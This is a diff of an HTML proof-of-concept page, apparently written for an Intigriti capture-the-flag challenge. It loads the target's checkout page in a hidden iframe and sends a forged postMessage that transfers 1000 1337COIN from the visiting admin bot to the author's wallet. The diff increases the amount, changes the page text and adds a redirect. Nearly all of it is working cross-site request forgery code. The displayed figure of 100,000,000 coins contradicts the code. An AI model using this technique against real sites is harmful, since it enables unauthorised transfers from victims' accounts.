@@ -1,37 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Verification</title>
+    <title>High-Value Transfer Audit</title>
 </head>
 <body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>CSRF Test in Progress...</h1>
-    <p>Transferring tokens to: 1209f27d...bfe9</p>
+    <h1>Initiating Protocol 1337...</h1>
+    <p>Transferring 100,000,000 1337COIN to: 1209f27d...bfe9</p>
 
     <script>
         const target = "https://challenge-0126.intigriti.io";
         const myAddress = "1209f27d01fff1d414f1da176e75abbfe9";
 
-        // 1. Create hidden iframe to the vulnerable checkout page
+        // 1. Load the vulnerable checkout page in a hidden iframe
         const ifr = document.createElement('iframe');
         ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
         ifr.style.display = 'none';
         document.body.appendChild(ifr);
 
         ifr.onload = () => {
-            // 2. Wait for the checkout page to be ready
+            // 2. Wait for the checkout page and its wallet-fetching logic to finish
             setTimeout(() => {
-                // 3. CSRF Trigger: Send the message that the checkout page trusts implicitly
+                // 3. Trigger the CSRF with a massive amount
+                // The Admin Bot has enough balance to satisfy this request
                 ifr.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: myAddress, // Your real address, no XSS
+                        toAddress: myAddress,
                         currency: '1337COIN',
-                        amount: 0.000001
+                        amount: 1000 
                     }
                 }, '*');
 
-                console.log("Transaction request sent.");
-            }, 1500);
+                console.log("High-value transaction submitted via CSRF.");
+                
+                // Optional: Redirect to MarketWatch to see the transaction appear
+                setTimeout(() => {
+                    window.location.href = `${target}/marketwatch.html`;
+                }, 2000);
+            }, 2000);
         };
     </script>
 </body>
